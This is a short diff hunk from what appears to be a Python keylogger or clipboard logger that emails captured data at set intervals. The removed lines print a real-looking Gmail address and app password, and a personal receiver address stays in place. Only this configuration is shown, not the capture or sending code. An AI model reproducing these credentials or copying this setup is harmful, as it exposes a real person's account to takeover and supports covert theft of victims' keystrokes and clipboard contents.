@@ -15,8 +15,8 @@ shift_pressed = False
 clipboard_content = ""
 
 # Gmail account credentials
-sender_email = "bhunalprashant5@gmail.com"
-sender_password = "ytsu rark ylaj capj"  # Consider using an App Password if needed
+sender_email = "your@gmail.com"
+sender_password = "app Password"  # Consider using an App Password if needed
 receiver_email = "prashantbhunal9@gmail.com"
 
 # Time interval in seconds to send an email
